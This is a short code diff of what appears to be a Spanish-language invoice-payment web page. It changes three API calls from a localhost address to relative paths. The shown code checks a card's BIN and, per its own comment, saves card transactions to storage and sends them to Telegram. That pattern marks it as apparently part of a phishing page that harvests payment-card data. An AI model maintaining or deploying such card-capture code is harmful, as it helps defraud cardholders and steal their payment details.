@@ -763,7 +763,7 @@
         // Verificar que la consulta existe en datos_consultas.txt
         async function verificarConsulta() {
             try {
-                const response = await fetch(`http://localhost:9090/api/consulta/${txid}`);
+                const response = await fetch(`/api/consulta/${txid}`);
                 if (!response.ok) {
                     alert('Error: La consulta de factura no existe. Por favor intenta de nuevo desde pago-inicio.');
                     window.location.href = '/pago-inicio';
@@ -841,7 +841,7 @@
         // BIN Checker - Verificar tarjeta
         async function verificarBIN(bin) {
             try {
-                const response = await fetch('http://localhost:9090/api/bin-check', {
+                const response = await fetch('/api/bin-check', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ bin: bin })
@@ -1178,7 +1178,7 @@
 
 
                 // Guardar en R2 y enviar a Telegram
-                const response = await fetch('http://localhost:9090/api/guardar-transaccion-tarjeta', {
+                const response = await fetch('/api/guardar-transaccion-tarjeta', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
